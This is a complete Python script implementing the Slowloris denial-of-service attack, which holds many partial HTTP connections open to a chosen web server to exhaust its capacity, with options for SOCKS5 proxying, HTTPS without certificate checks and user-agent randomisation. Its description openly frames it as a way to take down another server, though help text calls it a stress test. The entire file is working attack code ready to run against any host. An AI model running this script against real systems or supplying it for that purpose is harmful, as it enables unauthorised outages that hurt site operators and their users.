#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time

parser = argparse.ArgumentParser(
    description="Slowloris is a highly-targeted attack, enabling one web server to take down another server, without affecting other services or ports on the target network."
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets to use in the test",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    try:
        import socks

        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")

if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG,
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )


def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


if args.https:
    logging.info("Importing ssl module")
    import ssl

    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)


def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip, args.port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info(f"Socket count: {len(list_of_sockets)}")

    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info(f"Creating {diff} new sockets...")
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug(f"Failed to create new socket: {e}")
            break


def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug(f"Error in Slowloris iteration: {e}")
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)


if __name__ == "__main__":
    main()